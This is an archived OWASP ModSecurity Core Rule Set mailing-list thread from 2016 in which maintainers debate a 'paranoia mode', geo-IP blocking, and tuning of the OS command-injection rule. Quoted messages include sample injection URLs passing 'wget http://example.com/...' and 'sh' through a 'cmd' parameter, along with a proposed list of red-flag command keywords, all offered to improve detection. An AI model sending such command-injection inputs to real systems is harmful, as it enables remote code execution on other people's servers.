>> > > It lets me thing of a strike back. Look up the term aggressive on
>> > > The Merriam Webster dictionary. All the definitions point in that
>> > > direction:
>> > >
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>AhlRZYdCA&s=5&u=http%3a%2f%2fwww%2emerriam-webster%2ecom%2fdictionary%2fa
>>ggressive
>> > > Aggressive always means that you not only defend, but you attack as
>> > > well.
>> > >
>> > > (paranoia is entirely different in this regard. It does not imply
>> > > any counter strike)
>> > >
>> > > So I think aggressive does not entirely meet the character of the
>> > > new functionality, which is in line with the rest of the core rules
>> > > set in being entirely defensive. It just block attacks. It
>> > > absolutely does not attempt to shut down the client, inject malware
>> > > into the response or launch a DoS attack against the source IP
>> > > address (which would all be possible with the right set of rules).
>> > >
>> > > And what would be the complete term? Level of Aggression or Level of
>> > > Aggressiveness, Aggressiveness Setting? That all springs to mind.
>> > > And that just does not sounds very cool in my ears.
>> > > Or outrightly negative ("Level of Aggression!").
>> > >
>> > > So all in all, I think we should work with paranoia. It's the best I
>> > > can think of right now. And I thought about this a lot.
>> > >
>> > > But now let me hear what you think about it!
>> > >
>> > > Please do not take too long. My first pull request is almost ready,
>> > > so let's come to a resolution in the next few days.
>> > >
>> > > Best regards,
>> > >
>> > > Christian
>> > >
>> > >
>> > > --
>> > > Any technology that does not appear magical is insufficiently
>> > > advanced.
>> > > -- Gregory Benford
>> > > _______________________________________________
>> > > Owasp-modsecurity-core-rule-set mailing list
>> > > Owasp-modsecurity-core-rule-set at lists.owasp.org
>> > >
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>Fk-SZUSWw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule
>> > > -set
>> >
>> > --
>> > Walter Hop | PGP key:
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>Fw1QMMXCQ&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp
>> >
>>
>> > _______________________________________________
>> > Owasp-modsecurity-core-rule-set mailing list
>> > Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>A5gE8ZACQ&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-s
>> > et
>>
>>
>> --
>> mailto:christian.folini at netnea.com
>>
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>FtjFcMdCw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> twitter: @ChrFolini
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>>Owasp-modsecurity-core-rule-
>> set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>F42ScVGBg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>> ________________________________
>>  This message and any attachments are intended solely for the addressees
>> and may contain confidential information. Any unauthorized use or
>> disclosure, either whole or partial, is prohibited.
>> E-mails are susceptible to alteration. Our company shall not be liable
>>for the
>> message if altered, changed or falsified. If you are not the intended
>>recipient
>> of this message, please delete it and notify the sender.
>> Although all reasonable efforts have been made to keep this transmission
>> free from viruses, the sender will not be liable for damages caused by a
>> transmitted virus.
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>>Owasp-modsecurity-core-rule-
>> set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=3cPK1nhp_BL7w5UI6J48wD3HdLpFS8Zyx
>>F42ScVGBg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 13:39:20 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 13:39:20 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <20160218100305.GA4569@elias>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
Message-ID: <D2F07947.1A83E%csanders@trustwave.com>

This is actually surprising new information to me (and apparently Ryan as
he wrote the rule). This really does show the value of going back over
these rules. With this in mind I do think that we should definitely place
this in paranoid mode as my whole basis for not doing so was that it never
triggered. I have also merged your changes

On 2/18/16, 5:03 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
on behalf of christian.folini at netnea.com> wrote:

>Manuel
>
>On Thu, Feb 18, 2016 at 09:56:31AM +0000, Leos Rivas Manuel wrote:
>> Maybe you can have a rule before this to check &variable eq 0 and skip
>>the rule
>
>I guess so. But I wrote the default as empty variable and not
>non-existing variable. So I thought I would skip the "&variable eq 0".
>
>> but the cost of macro expansion in your @within against that very
>> simple regex should be very low, especially if you compare it to
>> other rules with multiple capturing +100 long regex ;)
>
>Yes. Think so too. And maybe there is even special code in pcre to
>reduce the costs of ^$.
>
>Ahoj,
>
>Christian
>
>
>--
>If you have men who will only come if they know there is a good road,
>I don't want them. I want men who will come if there is no road at all.
>-- David Livingstone
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=95zF1uCB2ZJfe9yLcH9VyKahmVYtxCoLTv
>06aa44Mw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 13:51:54 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 13:51:54 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <94D174DB-B8E3-431C-9E72-946C03F13C09@corp.ovh.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias> <D2F07947.1A83E%csanders@trustwave.com>
	<94D174DB-B8E3-431C-9E72-946C03F13C09@corp.ovh.com>
Message-ID: <D2F07CA0.1A84E%csanders@trustwave.com>

@Alban, This is a publicly available mailing list - you may unsubscribe
yourself.

On 2/22/16, 8:49 AM, "Alban Gernigon" <alban.gernigon at corp.ovh.com> wrote:

>Unsubscribe me please
>
>
>
>
>Le 22/02/2016 14:39, ?
>owasp-modsecurity-core-rule-set-bounces at lists.owasp.org au nom de Chaim
>Sanders ? <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org au nom
>de CSanders at trustwave.com> a ?crit :
>
>>This is actually surprising new information to me (and apparently Ryan as
>>he wrote the rule). This really does show the value of going back over
>>these rules. With this in mind I do think that we should definitely place
>>this in paranoid mode as my whole basis for not doing so was that it
>>never
>>triggered. I have also merged your changes
>>
>>On 2/18/16, 5:03 AM,
>>"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>>Christian Folini"
>><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>>on behalf of christian.folini at netnea.com> wrote:
>>
>>>Manuel
>>>
>>>On Thu, Feb 18, 2016 at 09:56:31AM +0000, Leos Rivas Manuel wrote:
>>>> Maybe you can have a rule before this to check &variable eq 0 and skip
>>>>the rule
>>>
>>>I guess so. But I wrote the default as empty variable and not
>>>non-existing variable. So I thought I would skip the "&variable eq 0".
>>>
>>>> but the cost of macro expansion in your @within against that very
>>>> simple regex should be very low, especially if you compare it to
>>>> other rules with multiple capturing +100 long regex ;)
>>>
>>>Yes. Think so too. And maybe there is even special code in pcre to
>>>reduce the costs of ^$.
>>>
>>>Ahoj,
>>>
>>>Christian
>>>
>>>
>>>--
>>>If you have men who will only come if they know there is a good road,
>>>I don't want them. I want men who will come if there is no road at all.
>>>-- David Livingstone
>>>_______________________________________________
>>>Owasp-modsecurity-core-rule-set mailing list
>>>Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>http://scanmail.trustwave.com/?c=4062&d=95zF1uCB2ZJfe9yLcH9VyKahmVYtxCoL
>>>Tv
>>>06aa44Mw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>>ow
>>>asp-modsecurity-core-rule-set
>>
>>
>>________________________________
>>
>>This transmission may contain information that is privileged,
>>confidential, and/or exempt from disclosure under applicable law. If you
>>are not the intended recipient, you are hereby notified that any
>>disclosure, copying, distribution, or use of the information contained
>>herein (including any reliance thereon) is strictly prohibited. If you
>>received this transmission in error, please immediately contact the
>>sender and destroy the material in its entirety, whether in electronic
>>or hard copy format.
>>_______________________________________________
>>Owasp-modsecurity-core-rule-set mailing list
>>Owasp-modsecurity-core-rule-set at lists.owasp.org
>>http://scanmail.trustwave.com/?c=4062&d=2ZHL1mJMsaHjgmZkgZnxexZ2LEZGqfYdt
>>IOdPJHG6Q&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 14:41:38 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 14:41:38 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <20160218094929.GA4093@elias>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
	<D2E6B8F1.1A467%csanders@trustwave.com>
	<CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>
	<20160218094929.GA4093@elias>
Message-ID: <D2F08827.1A882%csanders@trustwave.com>

I think a todo file or issues in the github are in order. I?m more in
favor of the second. I can make a custom label for each specific area if
we need. I think that will perform better because we can assign things and
track people progress etc. thoughts?

On 2/18/16, 4:49 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
on behalf of christian.folini at netnea.com> wrote:

>Hello,
>
>That is a smart move. It allows us to eliminate all "file splitting"
>tasks out of the paranoia mode project. Simplifies things a lot.
>
>@Chaim want to start a TODO file in the top folder of the CRS?
>
>Ahoj,
>
>Christian
>
>On Wed, Feb 17, 2016 at 09:05:52PM +0100, Franziska Buehler wrote:
>> Hi,
>>
>> I also like the idea of splitting the file. Perhaps we even need
>>multiple files.
>> Walter has a lot of good thougts!
>> This task doesn't seem to be very easy and some testing will be
>>necessary.
>> So I think we have to decide later, outside of this little project,
>> and we should move on to the first pull request.
>>
>> Regards,
>> Franziska
>>
>> 2016-02-15 5:07 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
>> > For the record I think this is a good idea but perhaps outside the
>>scope a
>> > bit of the initial RC release. Christian, I suggest we add this to the
>> > To-do for 3.1. Thoughts?
>> >
>> > On 2/12/16, 4:17 PM,
>> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>> > Christian Folini"
>><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>> > on behalf of christian.folini at netnea.com> wrote:
>> >
>> >>Hi there,
>> >>
>> >>There has not been any additional feedback in this thread, but I think
>> >>the question is not settled as of this writing.
>> >>
>> >>Thoughts?
>> >>
>> >>Regs,
>> >>
>> >>Christian
>> >>
>> >>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
>> >>> Hi there,
>> >>>
>> >>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
>> >>> > I like the idea of splitting the file.
>> >>>
>> >>> Cool.
>> >>>
>> >>> > I agree some of the words in os-commands.data seem rather
>>paranoid.
>> >>>Words like "choice", "help", "now? seem of low value and are common
>>in
>> >>>natural text. Also, the large number of Unix-only environments could
>> >>>skip Windows related commands. It?s hard for users to modify these
>>lists
>> >>>as you?d have to hack the CRS, and these huge collections are to
>> >>>maintain anyhow, so I agree we need granularity.
>> >>>
>> >>> Good point.
>> >>>
>> >>> > The rule has some regexp magic to prevent false positives, but the
>> >>>balance is not a complete success in my opinion. For instance, the
>> >>>following URLs don't trigger in CRSv3:
>> >>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
>> >>> > http://vuln/?cmd=sh%20blah.txt
>> >>> >
>> >>> > So it's not as strong as you would want either to prevent some
>>common
>> >>>RCE.
>> >>> > Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
>> >>>does trigger it.
>> >>>
>> >>> I see. Good observations.
>> >>>
>> >>> > 1) I think that a user should check their desired platforms in the
>> >>>setup conf. In fact, this would be great to do anyway in the initial
>> >>>3.0.0 release even if we DON'T look at it in any rule yet. Specifying
>> >>>platform types will pave the way for reducing false positives and
>>false
>> >>>negatives by skipping unnecessary checks and being more strict on the
>> >>>right platforms. So we could start by listing these platforms in the
>> >>>existing rule in the setup conf. Example:
>> >>> >
>> >>> >    SecAction \
>> >>> >      "id:'900024', \
>> >>> >      phase:1, \
>> >>> >      t:none, \
>> >>> >      setvar:tx.unix=1, \
>> >>> >      setvar:tx.windows=1, \
>> >>> >      setvar:tx.java=1, \
>> >>> >      setvar:tx.php=1, \
>> >>>
>> >>> That makes a lot of sense. At first sight.
>> >>>
>> >>> I think that a default install should come with these rulesets
>> >>> all enabled and a sysadmin can then switch them of if we is aware
>>that
>> >>> there is no php in his service.
>> >>>
>> >>> So given the following two scenarios
>> >>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
>> >>>positives
>> >>>     because he does not disable unneeded rulesets
>> >>> #2 - Newbie sysadmin installs ModSec and is p0wned because he does
>>not
>> >>>enable
>> >>>     the php protection
>> >>> I strongly favour #1.
>> >>>
>> >>> A vanilla install of the core rules should give you a full coverage
>>for
>> >>>all
>> >>> types of services and a decent security level. Reducing false
>>positives
>> >>>by
>> >>> omitting certain rules (ideally rules which provide no value for
>>your
>> >>>setup)
>> >>> is the very idea of tuning.
>> >>> Reducing the initial number of false positives by moving certain
>>rules
>> >>> with a worse relationsship between added security and false
>>positives,
>> >>> that is the idea of the paranoia mode.
>> >>>
>> >>> Chaim stated in a different message, that the rules are now
>>organised
>> >>> into files aimed at certain environments. So switching them off is
>> >>> fairly easy. And there are the tags on top of it.
>> >>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
>> >>> disable them all very easily.
>> >>>
>> >>> So I think, we do not need these variables.
>> >>>
>> >>> > (By the way: I think it?s unfortunate that a user has to use
>>value 1
>> >>>to enable a check. An undefined variable will mean that the CRS will
>> >>>skip some rules. This makes it dangerous to introduce a new variable
>>in
>> >>>the CRS later; all existing installations MUST then add this
>>variable to
>> >>>their setup rule immediately, or suffer from reduced security. It?s
>> >>>better to use a scheme that defaults to ?on?. A convention like
>> >>>?tx.disable_mysql=1? would be user unfriendly and error-prone. But we
>> >>>could check for an explicit ?off? string, e.g.
>>?setvar:tx.mysql=off?. If
>> >>>it?s not ?off? then assume that the user DOES want the check. I think
>> >>>it?s important to get this right in 3.0.0, it will be more painful
>>to do
>> >>>it later.)
>> >>>
>> >>> That's a very good observation. I had a similar idea once.
>> >>>
>> >>> In programming, you usually start with a default value and then
>> >>> the users overrides the default value. If he wants to.
>> >>>
>> >>> I am not sure how modsecurity_crs_10_setup.conf.example is going to
>> >>> be transformed to work seamlessly with 3.0. But this makes the
>> >>> setting of default values a bit tricky.
>> >>>
>> >>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
>> >>> if certain variables are not set.
>> >>>
>> >>> > 2) Separate the words into multiple lists:
>> >>> >    os-commands-critical.data (absolute red flag list: "curl",
>>"passwd",
>> >>>"sh", "uname", "wget" etc.)
>> >>> >    os-commands-paranoid.data (absolute low value, but high FP
>>natural
>> >>>words like "choice")
>> >>> >    os-commands-windows.data (all Windows commands)
>> >>> >    os-commands-common.data (all other commands)
>> >>>
>> >>> Makes some sense. Too granular is difficult and you mix various
>> >>> grouping criteria (criticality, paranoia, os), which makes is a
>> >>> bit hard to follow.
>> >>>
>> >>> Other opinions?
>> >>>
>> >>> > 3) Review the current regexp against some test data and CRSv2 to
>>make
>> >>>it more sensitive
>> >>>
>> >>> Good plan. Maybe this could be done in a separate pull request.
>> >>> I am afraid to overload the paranoia mode pull request...
>> >>>
>> >>> Ahoj,
>> >>>
>> >>> Christian
>> >>>
>> >>>
>> >>> --
>> >>> In war you will generally find that the enemy has at any time
>> >>> three courses of action open to him. Of those three, he will
>> >>> invariably choose the fourth.
>> >>> -- Helmuth Von Moltke
>> >>> _______________________________________________
>> >>> Owasp-modsecurity-core-rule-set mailing list
>> >>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >>>
>>
>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0me
>>>>>OIn
>>
>>>>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo
>>>>>%2f
>> >>>owasp-modsecurity-core-rule-set
>> >>
>> >>--
>> >>mailto:christian.folini at netnea.com
>>
>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meO
>>>>Inu
>> >>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> >>twitter: @ChrFolini
>> >>_______________________________________________
>> >>Owasp-modsecurity-core-rule-set mailing list
>> >>Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meO
>>>>Inu
>>
>>>>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2
>>>>fow
>> >>asp-modsecurity-core-rule-set
>> >
>> >
>> > ________________________________
>> >
>> > This transmission may contain information that is privileged,
>>confidential, and/or exempt from disclosure under applicable law. If you
>>are not the intended recipient, you are hereby notified that any
>>disclosure, copying, distribution, or use of the information contained
>>herein (including any reliance thereon) is strictly prohibited. If you
>>received this transmission in error, please immediately contact the
>>sender and destroy the material in its entirety, whether in electronic
>>or hard copy format.
>> > _______________________________________________
>> > Owasp-modsecurity-core-rule-set mailing list
>> > Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >
>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmK
>>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmK
>>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>owasp-modsecurity-core-rule-set
>
>--
>mailto:christian.folini at netnea.com
>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmKE
>YIczjUmg&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>twitter: @ChrFolini
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmKE
>NdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 14:43:09 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 14:43:09 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <20160218075309.GA10110@elias>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias>
Message-ID: <D2F08882.1A885%csanders@trustwave.com>

Hey guys,
Based on the fantastic work done I have changed my decision. I wanted to
let this list know as well. It should be noted of course that this is a
community, if everyone but me is in favor of something, then this is the
way it is :)

On 2/18/16, 2:53 AM, "Christian Folini" <christian.folini at netnea.com>
wrote:

>Chaim,
>
>It seems you have been the only one who wanted to keep the
>old country list active. Now Manuel and Franziska chimed
>in and stated they would rather not continue with the
>country list being active (or move it into paranoia) as
>others have before.
>
>For me, geoip-blocking is a separate decision on its own.
>If somebody wants to activate that, it should be a
>deliberate move, independent of the paranoia setting.
>It could be linked with a paranoia level and enabled
>as a side effect, but local sites in Romania would stop
>functioning immediately and that is not our
>intention with the paranoia mode.
>
>Enabling paranoia and then remember to think about
>activating / reconfiguring the country list in order to
>activate geoip-blocking is also complicated.
>
>So under the line, I think keeping the rule active
>but with a default empty list of countries is the
>best move in our situation.
>
>I am going to do a separate pull request for this change.
>That way it is completely independent of the paranoia
>mode changes.
>
>Ahoj,
>
>Christian
>
>
>--
>In war you will generally find that the enemy has at any time
>three courses of action open to him. Of those three, he will
>invariably choose the fourth.
>-- Helmuth Von Moltke


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Mon Feb 22 19:47:33 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 20:47:33 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <D2F08827.1A882%csanders@trustwave.com>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
	<D2E6B8F1.1A467%csanders@trustwave.com>
	<CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>
	<20160218094929.GA4093@elias>
	<D2F08827.1A882%csanders@trustwave.com>
Message-ID: <20160222194733.GC25903@elias>

Chaim,

That issues idea makes sense. I second that.

Cheers,

Christian

On Mon, Feb 22, 2016 at 02:41:38PM +0000, Chaim Sanders wrote:
> I think a todo file or issues in the github are in order. I?m more in
> favor of the second. I can make a custom label for each specific area if
> we need. I think that will perform better because we can assign things and
> track people progress etc. thoughts?
> 
> On 2/18/16, 4:49 AM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> on behalf of christian.folini at netnea.com> wrote:
> 
> >Hello,
> >
> >That is a smart move. It allows us to eliminate all "file splitting"
> >tasks out of the paranoia mode project. Simplifies things a lot.
> >
> >@Chaim want to start a TODO file in the top folder of the CRS?
> >
> >Ahoj,
> >
> >Christian
> >
> >On Wed, Feb 17, 2016 at 09:05:52PM +0100, Franziska Buehler wrote:
> >> Hi,
> >>
> >> I also like the idea of splitting the file. Perhaps we even need
> >>multiple files.
> >> Walter has a lot of good thougts!
> >> This task doesn't seem to be very easy and some testing will be
> >>necessary.
> >> So I think we have to decide later, outside of this little project,
> >> and we should move on to the first pull request.
> >>
> >> Regards,
> >> Franziska
> >>
> >> 2016-02-15 5:07 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
> >> > For the record I think this is a good idea but perhaps outside the
> >>scope a
> >> > bit of the initial RC release. Christian, I suggest we add this to the
> >> > To-do for 3.1. Thoughts?
> >> >
> >> > On 2/12/16, 4:17 PM,
> >> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> >> > Christian Folini"
> >><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> >> > on behalf of christian.folini at netnea.com> wrote:
> >> >
> >> >>Hi there,
> >> >>
> >> >>There has not been any additional feedback in this thread, but I think
> >> >>the question is not settled as of this writing.
> >> >>
> >> >>Thoughts?
> >> >>
> >> >>Regs,
> >> >>
> >> >>Christian
> >> >>
> >> >>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
> >> >>> Hi there,
> >> >>>
> >> >>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
> >> >>> > I like the idea of splitting the file.
> >> >>>
> >> >>> Cool.
> >> >>>
> >> >>> > I agree some of the words in os-commands.data seem rather
> >>paranoid.
> >> >>>Words like "choice", "help", "now? seem of low value and are common
> >>in
> >> >>>natural text. Also, the large number of Unix-only environments could
> >> >>>skip Windows related commands. It?s hard for users to modify these
> >>lists
> >> >>>as you?d have to hack the CRS, and these huge collections are to
> >> >>>maintain anyhow, so I agree we need granularity.
> >> >>>
> >> >>> Good point.
> >> >>>
> >> >>> > The rule has some regexp magic to prevent false positives, but the
> >> >>>balance is not a complete success in my opinion. For instance, the
> >> >>>following URLs don't trigger in CRSv3:
> >> >>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
> >> >>> > http://vuln/?cmd=sh%20blah.txt
> >> >>> >
> >> >>> > So it's not as strong as you would want either to prevent some
> >>common
> >> >>>RCE.
> >> >>> > Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
> >> >>>does trigger it.
> >> >>>
> >> >>> I see. Good observations.
> >> >>>
> >> >>> > 1) I think that a user should check their desired platforms in the
> >> >>>setup conf. In fact, this would be great to do anyway in the initial
> >> >>>3.0.0 release even if we DON'T look at it in any rule yet. Specifying
> >> >>>platform types will pave the way for reducing false positives and
> >>false
> >> >>>negatives by skipping unnecessary checks and being more strict on the
> >> >>>right platforms. So we could start by listing these platforms in the
> >> >>>existing rule in the setup conf. Example:
> >> >>> >
> >> >>> >    SecAction \
> >> >>> >      "id:'900024', \
> >> >>> >      phase:1, \
> >> >>> >      t:none, \
> >> >>> >      setvar:tx.unix=1, \
> >> >>> >      setvar:tx.windows=1, \
> >> >>> >      setvar:tx.java=1, \
> >> >>> >      setvar:tx.php=1, \
> >> >>>
> >> >>> That makes a lot of sense. At first sight.
> >> >>>
> >> >>> I think that a default install should come with these rulesets
> >> >>> all enabled and a sysadmin can then switch them of if we is aware
> >>that
> >> >>> there is no php in his service.
> >> >>>
> >> >>> So given the following two scenarios
> >> >>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
> >> >>>positives
> >> >>>     because he does not disable unneeded rulesets
> >> >>> #2 - Newbie sysadmin installs ModSec and is p0wned because he does
> >>not
> >> >>>enable
> >> >>>     the php protection
> >> >>> I strongly favour #1.
> >> >>>
> >> >>> A vanilla install of the core rules should give you a full coverage
> >>for
> >> >>>all
> >> >>> types of services and a decent security level. Reducing false
> >>positives
> >> >>>by
> >> >>> omitting certain rules (ideally rules which provide no value for
> >>your
> >> >>>setup)
> >> >>> is the very idea of tuning.
> >> >>> Reducing the initial number of false positives by moving certain
> >>rules
> >> >>> with a worse relationsship between added security and false
> >>positives,
> >> >>> that is the idea of the paranoia mode.
> >> >>>
> >> >>> Chaim stated in a different message, that the rules are now
> >>organised
> >> >>> into files aimed at certain environments. So switching them off is
> >> >>> fairly easy. And there are the tags on top of it.
> >> >>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
> >> >>> disable them all very easily.
> >> >>>
> >> >>> So I think, we do not need these variables.
> >> >>>
> >> >>> > (By the way: I think it?s unfortunate that a user has to use
> >>value 1
> >> >>>to enable a check. An undefined variable will mean that the CRS will
> >> >>>skip some rules. This makes it dangerous to introduce a new variable
> >>in
> >> >>>the CRS later; all existing installations MUST then add this
> >>variable to
